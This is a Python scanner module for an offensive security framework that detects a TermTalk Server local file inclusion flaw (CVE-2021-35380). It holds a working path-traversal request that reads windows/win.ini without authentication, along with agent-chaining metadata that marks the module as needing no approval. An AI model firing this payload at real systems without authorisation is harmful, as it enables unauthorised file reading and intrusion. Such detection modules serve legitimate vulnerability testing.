#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TermTalk Server (TTServer) 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TermTalk Server 3.24.0.2 - Local File Inclusion Detection',
        'description': 'TermTalk Server (TTServer) 3.24.0.2 is vulnerable to file inclusion which allows unauthenticated malicious user to gain access to the files on the remote system by providing the relative path of the file they want to retrieve.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'termtalk', 'lfi', 'unauth', 'lfr', 'edb', 'solari', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.swascan.com/solari-di-udine/',
            'https://www.exploit-db.com/exploits/50638',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-35380',
            'https://www.swascan.com/it/security-blog/',
            'https://github.com/anonymous364872/Rapier_Tool',
        ],
        'cve': 'CVE-2021-35380',
    }

    def run(self):
        r = self.http_request(method="GET", path='/file?valore=../../../../../windows/win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="TermTalk Server 3.24.0.2 - Local File Inclusion detected",
                path='/file?valore=../../../../../windows/win.ini',
            )
            return True
        return False

